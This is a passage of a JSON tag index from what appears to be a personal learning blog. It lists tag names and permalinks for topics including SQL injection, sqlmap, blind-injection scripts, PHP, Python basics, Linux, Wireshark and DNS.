tamper","slug":"sqlmap-tamper","permalink":"http://example.com/tags/sqlmap-tamper/"},{"name":"文件操作","slug":"文件操作","permalink":"http://example.com/tags/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"},{"name":"postman","slug":"postman","permalink":"http://example.com/tags/postman/"},{"name":"sql报错函数","slug":"sql报错函数","permalink":"http://example.com/tags/sql%E6%8A%A5%E9%94%99%E5%87%BD%E6%95%B0/"},{"name":"bool和睡眠盲注脚本","slug":"bool和睡眠盲注脚本","permalink":"http://example.com/tags/bool%E5%92%8C%E7%9D%A1%E7%9C%A0%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/"},{"name":"sql 注入","slug":"sql-注入","permalink":"http://example.com/tags/sql-%E6%B3%A8%E5%85%A5/"},{"name":"sqlmap","slug":"sqlmap","permalink":"http://example.com/tags/sqlmap/"},{"name":"联合查询","slug":"联合查询","permalink":"http://example.com/tags/%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2/"},{"name":"php","slug":"php","permalink":"http://example.com/tags/php/"},{"name":"html","slug":"html","permalink":"http://example.com/tags/html/"},{"name":"php函数","slug":"php函数","permalink":"http://example.com/tags/php%E5%87%BD%E6%95%B0/"},{"name":"简单网站功能实现","slug":"简单网站功能实现","permalink":"http://example.com/tags/%E7%AE%80%E5%8D%95%E7%BD%91%E7%AB%99%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0/"},{"name":"PHP","slug":"PHP","permalink":"http://example.com/tags/PHP/"},{"name":"Navicat","slug":"Navicat","permalink":"http://example.com/tags/Navicat/"},{"name":"安装","slug":"安装","permalink":"http://example.com/tags/%E5%AE%89%E8%A3%85/"},{"name":"python","slug":"python","permalink":"http://example.com/tags/python/"},{"name":"if条件判断","slug":"if条件判断","permalink":"http://example.com/tags/if%E6%9D%A1%E4%BB%B6%E5%88%A4%E6%96%AD/"},{"name":"循环语句","slug":"循环语句","permalink":"http://example.com/tags/%E5%BE%AA%E7%8E%AF%E8%AF%AD%E5%8F%A5/"},{"name":"列表","slug":"列表","permalink":"http://example.com/tags/%E5%88%97%E8%A1%A8/"},{"name":"元组","slug":"元组","permalink":"http://example.com/tags/%E5%85%83%E7%BB%84/"},{"name":"学习","slug":"学习","permalink":"http://example.com/tags/%E5%AD%A6%E4%B9%A0/"},{"name":"vue","slug":"vue","permalink":"http://example.com/tags/vue/"},{"name":"Linux","slug":"Linux","permalink":"http://example.com/tags/Linux/"},{"name":"基础知识","slug":"基础知识","permalink":"http://example.com/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"},{"name":"HTML","slug":"HTML","permalink":"http://example.com/tags/HTML/"},{"name":"CSS","slug":"CSS","permalink":"http://example.com/tags/CSS/"},{"name":"变量","slug":"变量","permalink":"http://example.com/tags/%E5%8F%98%E9%87%8F/"},{"name":"字符串","slug":"字符串","permalink":"http://example.com/tags/%E5%AD%97%E7%AC%A6%E4%B8%B2/"},{"name":"ip和路由","slug":"ip和路由","permalink":"http://example.com/tags/ip%E5%92%8C%E8%B7%AF%E7%94%B1/"},{"name":"proxifier","slug":"proxifier","permalink":"http://example.com/tags/proxifier/"},{"name":"wireshark抓包","slug":"wireshark抓包","permalink":"http://example.com/tags/wireshark%E6%8A%93%E5%8C%85/"},{"name":"博客搭建","slug":"博客搭建","permalink":"http://example.com/tags/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"},{"name":"主题配置","slug":"主题配置","permalink":"http://example.com/tags/%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE/"},{"name":"DNS域名解析","slug":"DNS域名解析","permalink":"http://example.com/tags/DNS%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90/"}]}